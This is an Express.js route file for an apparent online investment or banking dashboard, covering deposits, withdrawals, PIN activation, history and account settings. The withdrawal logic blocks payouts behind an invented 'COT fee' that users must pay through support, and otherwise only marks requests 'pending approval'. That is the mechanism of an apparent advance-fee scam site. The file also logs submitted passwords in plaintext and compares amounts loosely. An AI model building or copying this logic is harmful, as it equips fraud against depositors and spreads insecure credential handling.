const router = require("express").Router();
const {ensureAuthenticated} = require("../config/auth");
const User = require("../model/User");
const History = require("../model/History");
const bcrypt = require("bcryptjs");
const comma = require("../utils/comma");

router.get("/dashboard", ensureAuthenticated, (req,res) => {
    try{
        return res.render("dashboard", {pageTitle: "Dashbaord", layout: false, comma, req});
    }catch(err){
        return res.redirect("/");
    }
});

router.get("/deposit", ensureAuthenticated, (req,res) => {
    try{
        return res.render("deposit", {pageTitle: "Deposit Funds", comma, req});
    }catch(err){
        return res.redirect("/");
    }
});

router.get("/activate", ensureAuthenticated, (req,res) => {
    try{
        return res.render("activate", {pageTitle: "Activate Account", comma, req});
    }catch(err){
        return res.redirect("/");
    }
});


router.post("/activate", ensureAuthenticated, async (req,res) => {
    try{
        const {pin} = req.body;
        if(!pin){
            req.flash("error_msg", "Please enter PIN");
            return res.redirect("/activate");
        }
        if(pin[0] != req.user.pin){
            req.flash("error_msg", "Incorrect PIN");
            return res.redirect("/activate");   
        }
        await User.updateOne({_id: req.user.id}, {activated: true});
        req.flash("success_msg", "Your withdrawal request has been received and is pending approval.");
        return res.redirect("/withdrawal");

    }catch(err){
        console.log(err);
    }
});


router.get("/withdrawal", ensureAuthenticated, (req,res) => {
    try{
        return res.render("withdraw", {pageTitle: "Withdraw Funds", comma, req});
    }catch(err){
        return res.redirect("/");
    }
});

router.post("/withdrawal", ensureAuthenticated, async (req,res) => {
    try{
        const {amount} = req.body;
        if(!amount){
            req.flash("error_msg", "Please enter amount to withdraw");
            return res.redirect("/withdrawal");
        }
        if(req.user.balance < amount || amount < 0){
            req.flash("error_msg", "Insufficient funds.");
            return res.redirect("/withdrawal");
        }
        if(req.user.debt > 0){
            req.flash("error_msg", "You need to pay a COT fee of " + req.user.currency + " " + req.user.debt +  " to withdraw funds. Contact support for more details.");
            return res.redirect("/withdrawal");
        }
        if(!req.user.activated){
            return res.redirect("/activate");
        }
        else{
            await User.updateOne({_id: req.user.id}, {
                balance: Number(req.user.balance) - Number(amount)
            })
            req.flash("success_msg", "Your withdrawal request has been received and is pending approval");
            return res.redirect("/withdrawal");
        }
    }catch(err){
        return res.redirect("/");
    }
});

router.get("/history", ensureAuthenticated, async (req,res) => {
    try{
        const history = await History.find({userID: req.user.id});
        return res.render("history", {pageTitle: "Hisotry", comma, history, req});
    }catch(err){
        return res.redirect("/");
    }
});

router.get("/verify", ensureAuthenticated, (req,res) => {
    try{
        return res.render("verify", {pageTitle: "Verify Account", comma, req});
    }catch(err){
        return res.redirect("/");
    }
});

router.get("/account", ensureAuthenticated, (req,res) => {
    try{
        return res.render("account", {pageTitle: "Account Settings", comma, req});
    }catch(err){
        return res.redirect("/");
    }
});

router.post("/account", ensureAuthenticated, async (req,res) => {
    try{
        const {fullname, email, password, password2} = req.body;

        console.log(req.body)

        if(!fullname || !email){
            req.flash("error_msg", "Provide fullname and email");
            return res.redirect("/settings");
        }

        if(password){
            if(password.length < 6){
                req.flash("error_msg", "Password is too short");
                return res.redirect("/settings");
            }
            if(password != password2){
                req.flash("error_msg", "Password are not equal");
                return res.redirect("/settings");
            }
        }

        const update = {
            fullname,
            email
        }

        if(password){
            const salt = await bcrypt.genSalt();
            const hash = await bcrypt.hash(password2, salt);
            update.password = hash;
        }

        await User.updateOne({_id: req.user.id}, update);
        req.flash("success_msg", "Account updated successfully")
        return res.redirect("/settings");

    }catch(err){

    }
});

module.exports = router;